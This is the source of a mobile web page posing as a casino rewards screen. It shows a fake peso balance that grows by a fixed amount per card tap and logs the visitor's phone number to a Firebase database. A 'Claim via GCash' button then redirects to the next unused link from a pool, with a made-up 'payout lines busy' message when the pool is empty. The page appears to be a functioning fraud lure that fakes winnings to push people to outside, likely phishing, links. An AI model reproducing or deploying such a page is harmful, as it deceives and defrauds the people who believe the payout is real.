<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Rewards</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="js/config.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;900&display=swap" rel="stylesheet">
    <style>
        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); --bg: #04070d; }
        body { 
            background: var(--bg); color: #fff; font-family: 'Public Sans', sans-serif; 
            display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px;
            background-image: radial-gradient(circle at 50% -20%, #1e3a8a 0%, transparent 70%);
        }
        
        /* Header & Balance */
        .header { text-align: center; margin-top: 20px; margin-bottom: 25px; }
        .reward-label { color: #94a3b8; font-size: 12px; text-transform: uppercase; letter-spacing: 2px; font-weight: 700; }
        .reward-display { 
            font-size: 45px; font-weight: 900; background: var(--gold); 
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            filter: drop-shadow(0 0 10px rgba(212, 175, 55, 0.3)); margin: 5px 0;
        }

        /* Grid System */
        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; max-width: 360px; width: 100%; margin-bottom: 30px; }

        /* Card Styling */
        .card { 
            aspect-ratio: 1/1; background: rgba(255,255,255,0.03); border: 1px solid rgba(212, 175, 55, 0.2);
            border-radius: 18px; display: flex; align-items: center; justify-content: center;
            cursor: pointer; transition: all 0.3s ease; font-size: 28px; backdrop-filter: blur(10px);
        }
        .card:hover { transform: translateY(-5px); border-color: #ffdc6a; background: rgba(212, 175, 55, 0.05); }

        /* Click Animation */
        .card.clicked { animation: reveal 0.5s forwards; pointer-events: none; }
        @keyframes reveal {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); background: #d4af37; }
            100% { transform: scale(0.9); background: rgba(34, 197, 94, 0.1); border-color: #22c55e; opacity: 0.5; }
        }

        /* Bottom Section */
        .claim-section { 
            position: fixed; bottom: 30px; width: calc(100% - 40px); max-width: 400px; 
            background: rgba(4, 7, 13, 0.9); padding: 20px; border-radius: 20px;
            border: 1px solid rgba(212, 175, 55, 0.3); backdrop-filter: blur(20px);
            display: none; animation: slideUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        @keyframes slideUp { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        .btn-claim { 
            background: var(--gold); color: #000; border: none; padding: 18px; width: 100%; 
            border-radius: 14px; font-weight: 900; cursor: pointer; text-transform: uppercase;
            box-shadow: 0 10px 20px rgba(212, 175, 55, 0.2); font-size: 16px;
        }
    </style>
</head>
<body>

    <div class="header">
        <p class="reward-label">Available Balance</p>
        <div class="reward-display">₱<span id="currentBalance">0.00</span></div>
        <p id="statusMsg" style="font-size: 11px; color: #22c55e; letter-spacing: 1px;">TAP 5 CARDS TO BOOST PAYOUT</p>
    </div>

    <div class="grid" id="cardGrid"></div>

    <div class="claim-section" id="claimSection">
        <p style="margin-bottom: 15px; font-size: 13px; color: #cbd5e1; text-align: center;">Target reached! Your payout is ready for withdrawal.</p>
        <button class="btn-claim" onclick="redirectToVialink()">Claim via GCash</button>
    </div>

<script>
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const userPhone = localStorage.getItem("userPhone") || "Guest";

    let balance = 0;
    let clickCount = 0;
    const maxClicks = 5;

    window.onload = () => {
        const randomStart = [150, 200, 250, 350][Math.floor(Math.random() * 4)];
        updateBalance(randomStart);
        generateCards();
    };

    function generateCards() {
        const grid = document.getElementById('cardGrid');
        for (let i = 0; i < 9; i++) {
            const card = document.createElement('div');
            card.className = 'card';
            card.innerHTML = '🎁';
            card.onclick = () => handleCardClick(card);
            grid.appendChild(card);
        }
    }

    function handleCardClick(cardElement) {
        if (clickCount >= maxClicks || cardElement.classList.contains('clicked')) return;
        clickCount++;
        cardElement.classList.add('clicked');
        
        updateBalance(25);
        cardElement.innerHTML = `<span style="color:#22c55e; font-weight:bold; font-size:16px;">+25</span>`;

        if (clickCount === maxClicks) {
            document.getElementById('statusMsg').innerText = "VERIFICATION COMPLETE";
            document.getElementById('claimSection').style.display = 'block';
            logUserActivity();
        }
    }

    function updateBalance(amount) {
        balance += amount;
        document.getElementById('currentBalance').innerText = balance.toLocaleString('en-US', {minimumFractionDigits: 2});
    }

    function logUserActivity() {
        db.ref('user_logs/' + userPhone).set({
            phone: userPhone,
            reward: balance,
            status: 'idle',
            last_updated: new Date().toLocaleString()
        });
    }

    function redirectToVialink() {
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
            if (snapshot.exists()) {
                const linkId = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[linkId];
                db.ref('links/' + linkId).update({ status: 'pending', user: userPhone, timestamp: Date.now() });
                db.ref('user_logs/' + userPhone).update({ status: 'claimed' });
                window.location.href = linkData.url;
            } else {
                alert("All payout lines are busy. Try again in 10 minutes.");
            }
        });
    }
</script>
</body>
</html>
